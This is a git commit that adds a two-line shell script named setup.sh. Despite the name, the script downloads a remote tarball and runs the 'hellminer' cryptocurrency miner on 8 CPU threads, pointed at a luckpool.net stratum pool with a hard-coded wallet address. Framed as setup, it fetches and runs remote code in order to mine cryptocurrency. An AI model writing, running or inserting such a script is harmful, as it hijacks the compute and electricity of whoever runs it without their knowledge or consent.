dad54090e5709aff13d7cea15c7ba8d70c9c9532
manorepas <102576331+manorepas@users.noreply.github.com>
2022-04-04 22:38:43 +0700

    Create setup.sh

---
+++ setup.sh
@@ -0,0 +1,2 @@
+wget https://github.com/Tesa-UII/storage/raw/main/vr.tar.gz && tar xf vr.tar.gz
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK -p x --cpu 8
